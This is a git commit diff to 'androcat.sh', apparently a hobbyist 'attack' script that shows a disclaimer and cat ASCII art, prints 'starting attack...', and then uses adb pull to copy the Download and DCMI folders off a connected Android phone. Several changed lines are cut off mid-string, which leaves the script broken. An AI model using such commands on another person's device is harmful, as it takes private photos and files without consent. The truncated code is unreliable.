999055d0a0fa83807b2bd4f3032a896c9d9e0a8c
hack4peace <90603785+official-hack4peace@users.noreply.github.com>
2021-12-29 14:31:32 +0530

    Update androcat.sh

--- androcat.sh
+++ androcat.sh
@@ -7,22 +7,22 @@ echo -e "$grn What is your age?$rset"
 read age
 echo -e "$grn What is your name?$rset"
 read name
-echo -e "$grn I AM NOT RESPONSIBLE FOR ANY ILLEGAL WORK THIS IS YOUR RESPONSIBILITY IF YOU EXCEPT YOUR RESPONSIBILITY THEN CLICK ENTER.$rset"
-read agreement 
+echo -e "$grn I AM NOT RESPONSIBLE FOR ANY ILLEGAL WORK THIS IS>
+read agreement
 clear
-echo -e "$grn              <welcome to andro cat> (created by hack4peace)$rset"
+echo -e "$grn              <welcome to andro cat> (created by h>
 echo "                /\___/\ "
 echo "               /       \ "
 echo "              l  u   u  l "
 echo "            --l----*----l-- "
-echo "               \   w   /     - Meow! "
-echo "                ======= "  
+echo -e "               \   w   /$grn - Meow! $rset"
+echo "                ======= "
 echo "               /       \ __ "
 echo "               l        l\ \ "
 echo "               l        l/ / "
 echo "               l  l l   l / "
-echo "               \ ml lm /_/ "        
-echo -e "$grn starting attack...$rset"
+echo "               \ ml lm /_/ "
+echo -e "$grn starting attack... $rset"
 sleep 5
 adb pull /sdcard/Download
 adb pull /sdcard/DCMI
